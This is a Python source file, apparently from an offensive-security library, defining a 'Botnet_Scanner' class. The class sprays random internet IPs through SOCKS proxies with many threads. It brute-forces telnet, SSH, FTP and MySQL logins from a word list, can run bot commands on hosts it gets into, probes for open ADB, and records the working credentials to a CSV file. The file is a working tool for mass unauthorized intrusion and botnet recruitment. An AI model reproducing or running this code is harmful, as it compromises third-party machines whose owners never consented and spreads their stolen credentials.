import os, sys, socket, random, time, threading, xtelnet
from bane.common.payloads import *
from bane.scanners.vulnerabilities.adb_exploit import *

from bane.bruteforce.hydra import *
from bane.utils.pager.rand_generator import *
from bane.utils.handle_files import *



"""
  the following functions are used to scan safe IPs all over the internet with a word_list, it can scan bruteforce their: ftp, ssh, telnet, smtp and mysql logins then save them on text files in the same directory.
  it's highly recommended to be used with a VPS or your slow internet speed will be an obstacle to your scan.
"""


class Botnet_Scanner:
    
    def __init__(
        self,
        file_name="results.csv",
        protocol="telnet",
        telnet_bots=True,
        threads_daemon=True,
        logs=True,
        threads=100,
        word_list=[],
        commands=[],
        ip_range=None,
        timeout=7,
        p=23,
        socks4_proxies=None,
        socks5_proxies=None,
    ):
        self.proxies=Proxies_Interface.get_socket_proxies_from_parameters(socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        self.proxies=[x for x in self.proxies if x['proxy_type'] in ['socks4','socks5','s4','s5']]
        if self.proxies==[]:
            self.proxies=[{'proxy_host':None,'proxy_port':None,'proxy_username':None,'proxy_password':None,'proxy_type':None}]
        self.word_list=Userful_Utilities.load_word_list(word_list)
        self.logs = logs
        self.commands=[]
        self.protocol = protocol.lower()
        self.stop = False
        self.ip_range = ip_range
        self.timeout = timeout
        self.port = p
        self.result = []
        self.telnet_bots = telnet_bots
        self.file_name = file_name
        if os.path.exists(self.file_name) == False:
            Files_Interface.write_file("protocol,ip,port,username,password", self.file_name)
        for x in range(threads):
            t = threading.Thread(target=self.scan)
            t.daemon = threads_daemon
            t.start()

    def scan(self):
        try:
            time.sleep(1)
            while True:
                try:
                    if self.stop == True:
                        break
                    if self.ip_range == None:
                        ip = RANDOM_GENERATOR.get_safe_random_ip()
                    else:
                        ip = self.ip_range.format(
                            random.randint(0, 255),
                            random.randint(0, 255),
                            random.randint(0, 255),
                            random.randint(0, 255),
                        )
                    i = False
                    try:
                        so = socks.socksocket()
                        pr=random.choice(self.proxies)
                        if pr['proxy_type'] in ['socks4','s4']:
                            so.set_proxy(
                                proxy_type=socks.SOCKS4,
                                addr=pr['proxy_host'],
                                port=pr['proxy_port'],
                                username=pr['proxy_username'],
                                password=pr['proxy_password'],
                            )
                        elif pr['proxy_type'] in ['socks5','s5']:
                            so.set_proxy(
                                proxy_type=socks.SOCKS5,
                                addr=pr['proxy_host'],
                                port=pr['proxy_port'],
                                username=pr['proxy_username'],
                                password=pr['proxy_password'],
                            )
                        so.settimeout(self.timeout)
                        so.connect((ip, self.port))
                        i = True
                        so.close()
                    except:
                        pass
                    if self.stop == True:
                        break
                    if i == True:
                        if self.protocol == "adb":
                            q = ADB_Exploit_Scanner.scan(ip, timeout=self.timeout, p=self.port,**random.choice(self.proxies))
                            if q == True:
                                res = "adb:{}:{}::".format(ip, self.port)
                                Files_Interface.write_file(res, self.file_name)
                                self.result.append(res)
                                if self.logs == True:
                                    print(res)
                        else:
                            if self.protocol == "ssh":
                                func = Services_Login.ssh
                            elif self.protocol == "telnet":
                                func = Services_Login.telnet
                            elif self.protocol == "ftp":
                                func = Services_Login.ftp
                            elif self.protocol == "mysql":
                                func = Services_Login.mysql
                            for x in self.word_list:
                                proxy=random.choice(self.proxies)
                                if self.stop == True:
                                    break
                                try:
                                    username = x.split(":")[0]
                                    password = x.split(":")[1]
                                    if (
                                        self.protocol == "telnet"
                                        and self.telnet_bots == True
                                    ):
                                        q = func(
                                            ip,
                                            username,
                                            password,
                                            timeout=self.timeout,
                                            p=self.port,
                                            bot_mode=True,
                                            commands=self.commands,
                                            **proxy
                                        )
                                    else:
                                        q = func(
                                            ip,
                                            username,
                                            password,
                                            timeout=self.timeout,
                                            p=self.port,
                                            **proxy
                                        )
                                    if q == True:
                                        res = "{},{},{},{},{}".format(
                                            self.protocol,
                                            ip,
                                            self.port,
                                            username,
                                            password,
                                        )
                                        Files_Interface.write_file(res, self.file_name)
                                        self.result.append(res)
                                        if self.logs == True:
                                            print(res)
                                        break
                                except Exception as exx:
                                    if 'timeout' in str(exx).lower() or 'not a telnet service' in str(exx).lower() or 'timed out'  in str(exx).lower() or "connect"  in str(exx).lower():
                                        break
                except:
                    pass
            self.kill()
        except:
            pass

    def done(self):
        if "stop" in dir(self):
            return False
        return True

    def reset(self):
        l = []
        for x in self.__dict__:
            self.__dict__[x] = None
            l.append(x)
        for x in l:
            delattr(self, x)

    def kill(self):
        self.stop = True
        a = self.__dict__["found"]
        self.reset()  # this will kill any running threads instantly by setting all the attacking information to "None" and cause error which is handled with the "try...except..." around the main while loop
        return a
